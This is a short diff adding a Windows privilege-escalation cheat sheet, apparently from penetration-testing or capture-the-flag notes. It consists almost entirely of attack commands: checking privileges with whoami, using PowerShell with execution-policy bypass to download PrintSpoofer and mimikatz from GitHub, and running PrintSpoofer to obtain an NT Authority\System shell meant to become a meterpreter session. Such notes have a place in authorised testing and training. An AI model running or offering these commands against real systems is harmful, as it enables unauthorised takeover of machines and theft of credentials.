@@ -1,0 +1,15 @@
+# Priv esc
+shell
+
+# Displays security privileges of the current  user
+whoami /priv
+
+# Look this up
+powershell -ep bypass -c "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -o printspoofer.exe"
+
+# Print Spoofer - This grants us a NT Authority\System shell that we now need to turn into a meterpreter shell
+printspoofer.exe -i -c cmd.exe
+
+
+# Look this up
+powershell -ep bypass -c "wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip -o mimizip.zip"
